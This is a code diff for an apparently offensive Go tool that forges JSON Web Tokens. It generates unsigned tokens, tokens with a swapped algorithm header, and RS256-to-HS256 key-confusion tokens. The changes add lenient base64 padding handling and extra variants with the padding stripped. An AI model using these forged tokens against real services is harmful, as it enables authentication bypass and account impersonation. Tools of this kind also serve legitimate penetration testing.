@@ -63,7 +63,12 @@ func b64Decode(str string) string {
 	sDec, err := base64.StdEncoding.DecodeString(str)
 
 	if err != nil {
-		log.Fatal("error decoding: ", str, " :", err)
+		// Try to append padding before throwing error.
+		if strings.HasSuffix(str, "==") {
+			log.Fatal("error decoding: ", str, " :", err)
+		}
+
+		return b64Decode(str + "=")
 	}
 
 	return string(sDec)
@@ -75,6 +80,7 @@ func b64Encode(b []byte) string {
 
 func jwtWithoutSignature(encHeader string, encPayload string) {
 	fmt.Printf("JWT without signature:                 %s.%s.\n\n", encHeader, encPayload)
+	fmt.Printf("JWT without signature: RM Padding      %s.%s.\n\n", encHeader, strings.Trim(encPayload, "="))
 }
 
 func jwtWithoutSignatureAndNewAlg(strHeader string, encPayload string, alg string) {
@@ -83,7 +89,8 @@ func jwtWithoutSignatureAndNewAlg(strHeader string, encPayload string, alg strin
 	header.Alg = alg
 
 	newHeader, _ := json.Marshal(header)
-	fmt.Printf("JWT without signature, ALG:%s:       %s.%s.\n\n", alg, b64Encode(newHeader), encPayload)
+	fmt.Printf("JWT w/ sign, ALG:%s:                   %s.%s.\n\n", alg, b64Encode(newHeader), encPayload)
+	fmt.Printf("JWT w/ sign, ALG:%s:, RM Padding       %s.%s.\n\n", alg, strings.Trim(b64Encode(newHeader), "="), strings.Trim(encPayload, "="))
 }
 
 func RS256ToHS256(encHeader string, encPayload string, domain string) {
@@ -126,7 +133,9 @@ func RS256ToHS256(encHeader string, encPayload string, domain string) {
 	header.Alg = "HS256"
 	newHeader, _ := json.Marshal(header)
 	fmt.Printf("JWT RS256 to HS256:                    %s.%s.%s\n\n", b64Encode(newHeader), encPayload, signature)
+	fmt.Printf("JWT RS256 to HS256, RM Padding:        %s.%s.%s\n\n", strings.Trim(b64Encode(newHeader), "="), strings.Trim(encPayload, "="), signature)
 	fmt.Printf("JWT RS256 to HS256 (B64):              %s.%s.%s\n\n", b64Encode(newHeader), encPayload, b64Encode([]byte(signature)))
+	fmt.Printf("JWT RS256 to HS256 (B64), RM Padding:  %s.%s.%s\n\n", strings.Trim(b64Encode(newHeader), "="), strings.Trim(encPayload, "="), b64Encode([]byte(signature)))
 
 	// Remove certificate file..
 	os.Remove(certKeyFile)
